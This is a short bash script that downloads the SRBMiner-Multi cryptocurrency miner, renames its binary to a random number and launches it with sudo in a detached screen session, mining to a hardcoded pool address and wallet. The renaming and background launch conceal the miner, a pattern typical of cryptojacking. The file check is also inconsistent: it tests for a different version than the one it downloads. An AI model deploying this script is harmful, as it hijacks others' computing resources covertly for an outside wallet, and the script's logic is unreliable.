#!/bin/bash
ALG=verushash
WALS=Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY
POIL=51.79.251.11:3300
PASS=c=LTC,mc=VRSC
COMA="--disable-gpu --algorithm $ALG --pool $POIL --wallet $WALS --password $PASS"
TOP=$(shuf -n 1 -i 1-200000)

FILE=./SRBMiner-Multi-0-8-0-Linux.tar.xz
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
    tar xvf SRBMiner-Multi-0-8-5-Linux.tar.xz
    cd SRBMiner-Multi-0-8-5
    mv SRBMiner-MULTI $TOP
    chmod +x *
fi
screen -dmLS mine sudo ./$TOP $COMA
